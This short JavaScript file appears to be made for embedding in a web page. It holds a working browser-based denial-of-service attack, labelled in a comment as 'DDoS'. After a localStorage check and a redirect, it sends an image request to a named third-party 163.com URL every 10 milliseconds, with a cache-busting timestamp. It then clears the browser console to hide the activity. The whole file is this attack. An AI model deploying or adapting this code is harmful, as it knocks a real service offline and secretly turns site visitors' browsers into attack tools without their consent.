if (window.localStorage.getItem("user") != "true") {
  window.localStorage.setItem("user", "true");
  window.location.href = "https://xiaozhu2007.netlify.app/";
  window.localStorage.setItem("bypass", "true");
}

if (
  window.localStorage.getItem("user") === "true" &&
  window.localStorage.getItem("bypass") != "true"
) {
  // DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
  function imgflood() {
    var TARGET =
      "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
    var pic = new Image();
    pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
  }
  setTimeout(function () {
    setInterval(imgflood, 10);
  }, 8000);
}
// End
setTimeout(function () {
    console.clear()
}, 12000);
